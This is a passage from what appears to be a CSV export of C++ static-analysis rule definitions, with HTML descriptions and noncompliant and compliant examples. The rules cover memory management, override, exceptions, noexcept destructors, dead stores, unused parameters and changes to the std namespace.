  unique_ptr&lt;Circle&gt; c2{new Circle(0, 0, 5)}; // Clumsy, but still compliant by exception
}
</pre>
<h2>Exceptions</h2>
<p>If the result of a new is immediately passed as an argument to a function, we assume that the function takes ownership of the newly created object,
and won't raise an issue.</p>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rr-newdelete"">C++ core guidelines R.11</a> Avoid calling new and delete
explicitly</p>",cpp:S5025,cpp,C++,"<p>If you manage memory manually, it's your responsibility to <code>delete</code> all memory created with <code>new</code>, and to make sure it's
<code>delete</code>d once and only once. Ensuring this is done is error-prone, especially when your function can have early exit points. </p>
<p>Fortunately, the C++ language provides tools that automatically manage memory for you. Using them systematically makes the code simpler and more
robust without sacrificing performance.</p>
<p>This rule raises an issue when you use:</p>
<p>- <code>new</code> - you should prefer a factory function that returns a smart pointer, such as <code>std::make_unique</code> or, if shared
ownership is required, <code>std::make_shared</code>,</p>
<p>- <code>new[]</code> - you should prefer a container class, such as <code>std::vector</code>,</p>
<p>- <code>delete</code> or <code>delete[]</code> - if you followed the previous advice, there is no need to manually release memory.</p>
<p>If your compiler does not support <code>make_unique</code>, it's easy to write your own:</p>
<pre>
template&lt;typename T, typename... Args&gt;
std::unique_ptr&lt;T&gt; make_unique(Args&amp;&amp;... args) {
    return std::unique_ptr&lt;T&gt;(new T(std::forward&lt;Args&gt;(args)...));
}
</pre>
<h2>Noncompliant Code Example</h2>
<pre>
void f() {
  auto c = new Circle(0, 0, 5);
  c-&gt;draw();
  delete c;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f() {
  auto c = make_unique&lt;Circle&gt;(0, 0, 5);
  c-&gt;draw();
  unique_ptr&lt;Circle&gt; c2{new Circle(0, 0, 5)}; // Clumsy, but still compliant by exception
}
</pre>
<h2>Exceptions</h2>
<p>If the result of a new is immediately passed as an argument to a function, we assume that the function takes ownership of the newly created object,
and won't raise an issue.</p>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rr-newdelete"">C++ core guidelines R.11</a> Avoid calling new and delete
explicitly</p>",Memory should not be managed manually,[],CRITICAL,"['bad-practice', 'cpp11']",CODE_SMELL
2016-10-05T13:33:17+0200,"<p>Declaring overriding virtual functions with the <code>override</code> keyword (or <code>virtual</code> for code compliant with c++98, c++03
standards) removes the need to check the base class to determine whether a function is virtual. In addition, declaring a function as
<code>override</code> ensures that the function really overrides a function defined in a base class, making the code more robust.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  virtual void f();
};
class Derived : public Base
{
  void f(); // Noncompliant, implicitly declared ""virtual""
};
</pre>
<h2>Compliant Solution</h2>
<p>For code compliant with c++98 or c++03 standards:</p>
<pre>
class Base
{
  virtual void f();
};
class Derived : public Base
{
  virtual void f(); // Compliant, explicitly declared ""virtual""
};
</pre>
<p>For code compliant with at least c++11 standard:</p>
<pre>
class Base
{
  virtual void f();
};
class Derived : public Base
{
  void f() override; // Compliant
};
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 10-3-2 - Each overriding virtual function shall be declared with the virtual keyword. </li>
</ul>
<h3>See also</h3>
<ul>
  <li> <a href='/coding_rules#rule_key=cpp%3AS3471'>S3471</a> </li>
</ul>",cpp:S1016,cpp,C++,"<p>Declaring overriding virtual functions with the <code>override</code> keyword (or <code>virtual</code> for code compliant with c++98, c++03
standards) removes the need to check the base class to determine whether a function is virtual. In addition, declaring a function as
<code>override</code> ensures that the function really overrides a function defined in a base class, making the code more robust.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  virtual void f();
};
class Derived : public Base
{
  void f(); // Noncompliant, implicitly declared ""virtual""
};
</pre>
<h2>Compliant Solution</h2>
<p>For code compliant with c++98 or c++03 standards:</p>
<pre>
class Base
{
  virtual void f();
};
class Derived : public Base
{
  virtual void f(); // Compliant, explicitly declared ""virtual""
};
</pre>
<p>For code compliant with at least c++11 standard:</p>
<pre>
class Base
{
  virtual void f();
};
class Derived : public Base
{
  void f() override; // Compliant
};
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 10-3-2 - Each overriding virtual function shall be declared with the virtual keyword. </li>
</ul>
<h3>See also</h3>
<ul>
  <li> {rule:cpp:S3471} </li>
</ul>","Overriding virtual functions should be declared with ""override""",[],MAJOR,['misra'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Nesting <code>try</code>/<code>catch</code> or <code>@try</code>/<code>@catch</code> blocks severely impacts the readability of source code because
it makes it too difficult to understand which block will catch which exception.</p>
<p>This C++ example also applies to Objective-C.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  try {                                     // Noncompliant
    doSomething();
  } catch (RuntimeException e) {
    /* Ignore */
  }

  doSomethingElse();
} catch (Exception e) {
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  dedicatedMethod();                        // Compliant
  doSomethingElse();
} catch (Exception e) {
  /* ... */
}

/* ... */

private void dedicatedMethod() {
  try {                                     // Compliant
    doSomething();
  } catch (RuntimeException e) {
    /* Ignore */
  }
}
</pre>",cpp:S1141,cpp,C++,"<p>Nesting <code>try</code>/<code>catch</code> or <code>@try</code>/<code>@catch</code> blocks severely impacts the readability of source code because
it makes it too difficult to understand which block will catch which exception.</p>
<p>This C++ example also applies to Objective-C.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  try {                                     // Noncompliant
    doSomething();
  } catch (RuntimeException e) {
    /* Ignore */
  }

  doSomethingElse();
} catch (Exception e) {
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  dedicatedMethod();                        // Compliant
  doSomethingElse();
} catch (Exception e) {
  /* ... */
}

/* ... */

private void dedicatedMethod() {
  try {                                     // Compliant
    doSomething();
  } catch (RuntimeException e) {
    /* Ignore */
  }
}
</pre>",Try-catch blocks should not be nested,[],MAJOR,"['confusing', 'error-handling']",CODE_SMELL
2014-05-24T08:26:46+0200,"<p>While exceptions are a common feature of modern languages, there are several reasons to potentially avoid them:</p>
<ul>
  <li> They make the control flow of a program difficult to understand, because they introduce additional exit points. </li>
  <li> The use of exceptions in new code can make that code difficult to integrate with existing, non-exception-safe code. </li>
  <li> They add to the size of each binary produced, thereby increasing both compile time and final executable size. </li>
  <li> They may incur a small performance penalty. </li>
  <li> The time required to handle an exception is not easy to assess, which makes them difficult to use for hard real-time applications. </li>
</ul>
<p>This rule raises an issue when: </p>
<ul>
  <li> an exception is <code>throw</code>n </li>
  <li> a <code>try</code>-<code>catch</code> block is used </li>
  <li> an exception specification (<code>throw(xxx)</code>) is present. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>This C++ code example also applies to Objective-C.</p>
<pre>
double myfunction(char param) throw (int); // Noncompliant
void f {
  try // Noncompliant
  {
    do_something();
    throw 1; // Noncompliant
  }
  catch (...)
  {
    // handle exception
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
double myfunction(char param) noexcept;
bool f {
  if (!do_something()); {
    // Handle the situation
    return false;
  }
  // Rest of the code
  return true;
}
</pre>
<h2>Exceptions</h2>
<p><code>noexcept</code> specifications are ignored, because even if you choose not to use exceptions in your code, it's important to decorate as
<code>noexcept</code> certain functions (for instance, move constructors that do not <code>throw</code>). This decoration can be detected by type
traits, and some meta-programming techniques rely on this information.</p>",cpp:S1706,cpp,C++,"<p>While exceptions are a common feature of modern languages, there are several reasons to potentially avoid them:</p>
<ul>
  <li> They make the control flow of a program difficult to understand, because they introduce additional exit points. </li>
  <li> The use of exceptions in new code can make that code difficult to integrate with existing, non-exception-safe code. </li>
  <li> They add to the size of each binary produced, thereby increasing both compile time and final executable size. </li>
  <li> They may incur a small performance penalty. </li>
  <li> The time required to handle an exception is not easy to assess, which makes them difficult to use for hard real-time applications. </li>
</ul>
<p>This rule raises an issue when: </p>
<ul>
  <li> an exception is <code>throw</code>n </li>
  <li> a <code>try</code>-<code>catch</code> block is used </li>
  <li> an exception specification (<code>throw(xxx)</code>) is present. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>This C++ code example also applies to Objective-C.</p>
<pre>
double myfunction(char param) throw (int); // Noncompliant
void f {
  try // Noncompliant
  {
    do_something();
    throw 1; // Noncompliant
  }
  catch (...)
  {
    // handle exception
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
double myfunction(char param) noexcept;
bool f {
  if (!do_something()); {
    // Handle the situation
    return false;
  }
  // Rest of the code
  return true;
}
</pre>
<h2>Exceptions</h2>
<p><code>noexcept</code> specifications are ignored, because even if you choose not to use exceptions in your code, it's important to decorate as
<code>noexcept</code> certain functions (for instance, move constructors that do not <code>throw</code>). This decoration can be detected by type
traits, and some meta-programming techniques rely on this information.</p>",Exceptions should not be used,[],MAJOR,[],CODE_SMELL
2015-11-05T15:08:05+0100,"<p>The use of <code>bool</code> operands with other operators is unlikely to be meaningful (or intended). Best case it will be confusing to
maintainers, worst case it will not have the intended effect. Either way, it is highly recommended to stick to boolean operators when dealing with
<code>bool</code> operands.</p>
<p>This rule allows the detection of such uses, which often occur because the logical operators (<code>&amp;&amp;</code>, <code>||</code> and
<code>!</code>) can be easily confused with the bitwise operators (<code>&amp;</code>, <code>|</code> and <code>~</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
bool b1 = true;
bool b2 = false;
int8_t s8a;
if ( b1 &amp; b2 ) // Noncompliant
if ( ~b1 ) // Noncompliant
if ( b1 &lt; b2 ) // Noncompliant
if ( b1 ^ b2 ) // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( b1 &amp;&amp; b2 )
if ( !b1 )
if ( b1 == false )
if ( b1 == b2 )
if ( b1 != b2 )
s8a = b1 ? 3 : 7;
</pre>
<h2>Exceptions</h2>
<p>Operators <code>|=</code> and <code>&amp;=</code> are ignored when used with <code>bool</code> operands. Operator <code>++</code> is also ignored
with a <code>bool</code> operand because it is covered by rule S2668.</p>
<pre>
void test(bool b1, bool b2, int i1) {
  b1 |= b2; // ignored
  b1++; // ignored here, handled by S2668
  b1 &amp;= b2; // ignored
  b1 &amp;= i1; // Noncompliant; right operand is not a bool
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 4-5-1 - Expressions with type bool shall not be used as operands to built-in operators other than the assignment operator =,
  the logical operators &amp;&amp;, ||, !, the equality operators == and !=, the unary &amp; operator, and the conditional operator. </li>
</ul>",cpp:S872,cpp,C++,"<p>The use of <code>bool</code> operands with other operators is unlikely to be meaningful (or intended). Best case it will be confusing to
maintainers, worst case it will not have the intended effect. Either way, it is highly recommended to stick to boolean operators when dealing with
<code>bool</code> operands.</p>
<p>This rule allows the detection of such uses, which often occur because the logical operators (<code>&amp;&amp;</code>, <code>||</code> and
<code>!</code>) can be easily confused with the bitwise operators (<code>&amp;</code>, <code>|</code> and <code>~</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
bool b1 = true;
bool b2 = false;
int8_t s8a;
if ( b1 &amp; b2 ) // Noncompliant
if ( ~b1 ) // Noncompliant
if ( b1 &lt; b2 ) // Noncompliant
if ( b1 ^ b2 ) // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( b1 &amp;&amp; b2 )
if ( !b1 )
if ( b1 == false )
if ( b1 == b2 )
if ( b1 != b2 )
s8a = b1 ? 3 : 7;
</pre>
<h2>Exceptions</h2>
<p>Operators <code>|=</code> and <code>&amp;=</code> are ignored when used with <code>bool</code> operands. Operator <code>++</code> is also ignored
with a <code>bool</code> operand because it is covered by rule S2668.</p>
<pre>
void test(bool b1, bool b2, int i1) {
  b1 |= b2; // ignored
  b1++; // ignored here, handled by S2668
  b1 &amp;= b2; // ignored
  b1 &amp;= i1; // Noncompliant; right operand is not a bool
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 4-5-1 - Expressions with type bool shall not be used as operands to built-in operators other than the assignment operator =,
  the logical operators &amp;&amp;, ||, !, the equality operators == and !=, the unary &amp; operator, and the conditional operator. </li>
</ul>","""bool"" expressions should not be used as operands to built-in operators other than =, &&, ||, !, ==, !=, unary &, and the conditional operator",[],MAJOR,"['misra', 'suspicious']",CODE_SMELL
2016-07-20T11:22:22+0200,"<p>Throwing an exception from a destructor results in undefined behavior, meaning that your program could be terminated abruptly without neatly
destroying others objects.</p>
<p>Thus destructors should never <code>throw</code> exceptions. Instead, they should catch and handle those thrown by the functions they call, and be
<code>noexcept</code>.</p>
<p>This rule raises an issue when a destructor is not <code>noexcept</code>. By default, destructors are <code>noexcept</code>, therefore most of the
time, nothing needs to be written in the source code. A destructor is not <code>noexcept</code> if:</p>
<p>- the base class or a data member has a non <code>noexcept</code> destructor,</p>
<p>- the destructor is decorated with the <code>noexcept</code> keyword followed by something that evaluates to false.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct A {
  ~A() noexcept(false) {} // Noncompliant
};

struct C {
  /* ... */
  A a; // This member data prevents automatic declaration of the destructor as noexcept
  ~C() { // Noncompliant
    /* ... */
  }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct A {
  ~A() noexcept(true) {}
};

struct C {
  /* ... */
  A a;
  ~C() { // Compliant, noexcept by default
    /* ... */
  }
};
</pre>",cpp:S3654,cpp,C++,"<p>Throwing an exception from a destructor results in undefined behavior, meaning that your program could be terminated abruptly without neatly
destroying others objects.</p>
<p>Thus destructors should never <code>throw</code> exceptions. Instead, they should catch and handle those thrown by the functions they call, and be
<code>noexcept</code>.</p>
<p>This rule raises an issue when a destructor is not <code>noexcept</code>. By default, destructors are <code>noexcept</code>, therefore most of the
time, nothing needs to be written in the source code. A destructor is not <code>noexcept</code> if:</p>
<p>- the base class or a data member has a non <code>noexcept</code> destructor,</p>
<p>- the destructor is decorated with the <code>noexcept</code> keyword followed by something that evaluates to false.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct A {
  ~A() noexcept(false) {} // Noncompliant
};

struct C {
  /* ... */
  A a; // This member data prevents automatic declaration of the destructor as noexcept
  ~C() { // Noncompliant
    /* ... */
  }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct A {
  ~A() noexcept(true) {}
};

struct C {
  /* ... */
  A a;
  ~C() { // Compliant, noexcept by default
    /* ... */
  }
};
</pre>","Destructors should be ""noexcept""",[],BLOCKER,"['cpp11', 'error-handling']",BUG
2014-06-30T14:50:25+0200,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {
}
</pre>
<h2>Exceptions</h2>
<p>In the case of empty expanded macro and in the case of 2 consecutive semi-colons when one of the two is part of a macro-definition then the issue
is not raised.</p>
<p>Example:</p>
<pre>
#define A(x) x;
#define LOG(x)

void fun() {
  A(5);
  LOG(X);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",cpp:S1116,cpp,C++,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {
}
</pre>
<h2>Exceptions</h2>
<p>In the case of empty expanded macro and in the case of 2 consecutive semi-colons when one of the two is part of a macro-definition then the issue
is not raised.</p>
<p>Example:</p>
<pre>
#define A(x) x;
#define LOG(x)

void fun() {
  A(5);
  LOG(X);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",Empty statements should be removed,[],MINOR,"['cert', 'misra', 'unused']",CODE_SMELL
2018-12-21T09:50:14+0100,"<p>The functions <code>memcpy</code>, <code>memmove</code>, and <code>memset</code> can only be used for objects of trivially copyable types. This
includes scalar types, arrays, and trivially copyable classes.</p>
<p>A class type is trivially copyable if:</p>
<ul>
  <li> One or more of the following methods is trivial and the rest are deleted: copy constructor, move constructor, copy assignment operator, and
  move assignment operator, </li>
  <li> It has a trivial, non-deleted destructor. </li>
</ul>
<p>A consequence of those rules is that a trivially copyable class type can only have trivially copyable members or base classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Shape {
public:
  int x;
  int y;
  virtual ~Shape(); // This makes the class non trivially copyable
};

void f(Shape *dest, Shape *source)
{
    memcpy(dest, source, sizeof Shape); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Shape {
public:
  int x;
  int y;
  virtual ~Shape(); // This makes the class non trivially copyable
};

void f(Shape *dest, Shape *source)
{
    (*dest) = (*source);
}
</pre>",cpp:S4999,cpp,C++,"<p>The functions <code>memcpy</code>, <code>memmove</code>, and <code>memset</code> can only be used for objects of trivially copyable types. This
includes scalar types, arrays, and trivially copyable classes.</p>
<p>A class type is trivially copyable if:</p>
<ul>
  <li> One or more of the following methods is trivial and the rest are deleted: copy constructor, move constructor, copy assignment operator, and
  move assignment operator, </li>
  <li> It has a trivial, non-deleted destructor. </li>
</ul>
<p>A consequence of those rules is that a trivially copyable class type can only have trivially copyable members or base classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Shape {
public:
  int x;
  int y;
  virtual ~Shape(); // This makes the class non trivially copyable
};

void f(Shape *dest, Shape *source)
{
    memcpy(dest, source, sizeof Shape); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Shape {
public:
  int x;
  int y;
  virtual ~Shape(); // This makes the class non trivially copyable
};

void f(Shape *dest, Shape *source)
{
    (*dest) = (*source);
}
</pre>","""memcpy"", ""memmove"", and ""memset"" should only be called with pointers to trivially copyable types",[],BLOCKER,[],BUG
2016-02-22T18:02:41+0100,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores:</p>
<ul>
  <li> variable declarations initializers </li>
  <li> prefix and postfix increments and decrements <code>x++;</code> </li>
  <li> null pointer assignments <code>x = NULL;</code> </li>
  <li> self assignments (i.e. <code>x = x;</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",cpp:S1854,cpp,C++,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores:</p>
<ul>
  <li> variable declarations initializers </li>
  <li> prefix and postfix increments and decrements <code>x++;</code> </li>
  <li> null pointer assignments <code>x = NULL;</code> </li>
  <li> self assignments (i.e. <code>x = x;</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",Dead stores should be removed,[],MAJOR,"['cert', 'cwe', 'unused']",CODE_SMELL
2016-10-05T13:33:17+0200,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>In case of Objective-C it is acceptable to have unused parameters if the method is supposed to be overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) { // Noncompliant, ""b"" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",cpp:S1172,cpp,C++,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>In case of Objective-C it is acceptable to have unused parameters if the method is supposed to be overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) { // Noncompliant, ""b"" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Unused function parameters should be removed,[],MAJOR,"['cert', 'misra', 'unused']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments explicitly enclosed in parentheses are ignored.</p>
<pre>
while ((run = keepRunning())) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",cpp:AssignmentInSubExpression,cpp,C++,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments explicitly enclosed in parentheses are ignored.</p>
<pre>
while ((run = keepRunning())) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",Assignments should not be made from within sub-expressions,[],MAJOR,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2016-01-26T09:39:35+0100,"<p>It may seem tidy to add your new declarations to the <code>std</code> or <code>posix</code> namespaces, but doing so results in undefined behavior.
The C++14 Standard, [namespace.std] (ISO/IEC 14882-2014 Ã‚Â§17.6.4.2.1), paragraphs 1 and 2 states:</p>
<blockquote>
  <ol>
    <li> The behavior of a C++ program is undefined if it adds declarations or definitions to namespace std or to a namespace within namespace std
    unless otherwise specified. A program may add a template specialization for any standard library template to namespace std only if the declaration
    depends on a user-defined type and the specialization meets the standard library requirements for the original template and is not explicitly
    prohibited. </li>
    <li> The behavior of a C++ program is undefined if it declares:
      <ul>
        <li> an explicit specialization of any member function of a standard library class template, or </li>
        <li> an explicit specialization of any member function template of a standard library class or class template, or </li>
        <li> an explicit or partial specialization of any member class template of a standard library class or class template. </li>
      </ul> </li>
  </ol>
</blockquote>
<p>In addition to restricting extensions to the the <code>std</code> namespace, the C++14 Standard goes on in Ã‚Â§17.6.4.2.2 to say:</p>
<blockquote>
  <ol>
    <li> The behavior of a C++ program is undefined if it adds declarations or definitions to namespace posix or to a namespace within namespace posix
    unless otherwise specified. The namespace posix is reserved for use by ISO/IEC 9945 and other POSIX standards. </li>
  </ol>
</blockquote>
<p>This rule raises an issue for any modification of the standard <code>std</code> and <code>posix</code> namespaces.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace std {  // Noncompliant
  int x;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace expanded_std {
  int x;
}
</pre>
<h2>Exceptions</h2>
<p>A namespace fragment that only contains template specializations or explicit instantiations is ignored by this rule.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/LwDTAQ"">CERT, DCL58-CPP.</a> - Do not modify the standard namespaces </li>
</ul>",cpp:S3470,cpp,C++,"<p>It may seem tidy to add your new declarations to the <code>std</code> or <code>posix</code> namespaces, but doing so results in undefined behavior.
The C++14 Standard, [namespace.std] (ISO/IEC 14882-2014 Ã‚Â§17.6.4.2.1), paragraphs 1 and 2 states:</p>
<blockquote>
  <ol>
    <li> The behavior of a C++ program is undefined if it adds declarations or definitions to namespace std or to a namespace within namespace std
    unless otherwise specified. A program may add a template specialization for any standard library template to namespace std only if the declaration
    depends on a user-defined type and the specialization meets the standard library requirements for the original template and is not explicitly
    prohibited. </li>
    <li> The behavior of a C++ program is undefined if it declares:
      <ul>
        <li> an explicit specialization of any member function of a standard library class template, or </li>
        <li> an explicit specialization of any member function template of a standard library class or class template, or </li>
        <li> an explicit or partial specialization of any member class template of a standard library class or class template. </li>
      </ul> </li>
  </ol>
</blockquote>
<p>In addition to restricting extensions to the the <code>std</code> namespace, the C++14 Standard goes on in Ã‚Â§17.6.4.2.2 to say:</p>
<blockquote>
  <ol>
    <li> The behavior of a C++ program is undefined if it adds declarations or definitions to namespace posix or to a namespace within namespace posix
    unless otherwise specified. The namespace posix is reserved for use by ISO/IEC 9945 and other POSIX standards. </li>
  </ol>
</blockquote>
<p>This rule raises an issue for any modification of the standard <code>std</code> and <code>posix</code> namespaces.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace std {  // Noncompliant
  int x;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace expanded_std {
  int x;
}
</pre>
<h2>Exceptions</h2>
<p>A namespace fragment that only contains template specializations or explicit instantiations is ignored by this rule.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/LwDTAQ"">CERT, DCL58-CPP.</a> - Do not modify the standard namespaces </li>
